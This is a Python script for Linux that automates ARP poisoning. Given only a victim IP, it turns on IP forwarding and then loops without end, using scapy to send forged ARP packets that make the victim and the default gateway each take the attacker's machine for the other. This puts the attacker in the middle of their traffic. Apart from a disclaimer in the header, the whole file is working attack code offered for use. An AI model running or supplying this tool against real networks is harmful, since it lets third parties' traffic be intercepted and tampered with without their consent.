'''
Author: Jake Wachs
Aug 2020

A Python script for Linux that automates
the boring parts of ARP Poisoning.

All you need is victim IP, arpPoison does the rest!

Usage: sudo python3 arpPoison.py <victim_ip>

***NOTE: I do NOT condone usage of this script for
ANYTHING besides educational and/or legal endeavors.
If you use this for malicious purposes, I hope you
get caught.***
'''

'''
TODO:
 - fix output so that it still prints red disabling port forwarding
'''

import re
import os
import sys
import subprocess
from subprocess import Popen, PIPE
import scapy.all as scap
from getmac import get_mac_address
from signal import signal, SIGINT
from termcolor import colored
import contextlib

def exitHandler(signal, frame):
	'''
	SIGINT handler for ending program
	'''
	togglePortForwarding(0)	
	exit(0)


def extractIP(line):
	'''
	Gets the IP address from a line of text

	Keyword Arguments:
	line - line of text provided via readline() method

	return - IP address
	'''
	ip = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line)

	if len(ip) < 1:
		print('No default IP address could be found')		# FIXME: print to stderr
		exit(-1)

	return ip[0]


def getDefaultGateway(output):
	'''
	Gets the IP address of the default gateway via parsing

	Keyword Arguments:
	output - A BufferedReader object; the output of the ip tool

	return - IP of default gateway
	'''
	currLine = output.stdout.readline().decode('utf-8')
	while currLine:
		if 'default' in currLine:
			return extractIP(currLine)

		currLine = output.stdout.readline().decode('utf-8')


def togglePortForwarding(t):
	'''
	Enables/disables port forwarding on the local, attacking machine

	Keyword arguments:
	t - toggle set for enable, clear for disable
	'''
	assert(t == 0 or t == 1)

	if t == 1:
		stmt = colored('[*] Enabling port forwarding', 'green')
	elif t == 0:
		stmt = colored('[*] Disabling port forwarding', 'red')

	print(stmt)
	cmd = 'net.ipv4.ip_forward=' + str(t) 
	subprocess.call(['sysctl', '-w', cmd])


if __name__ == '__main__':
	signal(SIGINT, exitHandler)		# Listening for ctrl + c

	if len(sys.argv) < 2:
		print('Usage: sudo python3 arpPoison.py <target_IP_address>')
		print('*** sudo privileges required for modification of port forwarding')
		exit(-1)
	else:
		victim_ip = sys.argv[1]

		p = Popen(['ip', 'r'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
		try:
			gateway_ip = getDefaultGateway(p)
		except:
			print('No default gateway could be found')		# FIXME: print to stderr
			exit(-1)

		attacker_mac = get_mac_address()	

		togglePortForwarding(1)	
	
		
		print(colored('[*] Beginning ARP poison, Ctrl+c to quit', 'yellow'))
		print(' -- GATEWAY: ', gateway_ip)
		print(' -- VICTIM: ', victim_ip)

		i = 0
		while True:
			i = i + 1

			with contextlib.redirect_stdout(None):	
				# Telling the victim 'I am the router'
				vic_packet = scap.ARP(op=1, pdst=victim_ip, hwsrc=attacker_mac, psrc=gateway_ip)
				scap.send(vic_packet)

				# Telling the router 'I am the victim'
				router_packet = scap.ARP(op=1, pdst=gateway_ip, hwsrc=attacker_mac, psrc=victim_ip)
				scap.send(router_packet)
			
			if i % 25 == 0:
				print('[+] Poisoning active')
				print(' |')
				print(' |--> Gateway: ', gateway_ip)
				print(' |--> Victim: ', victim_ip)
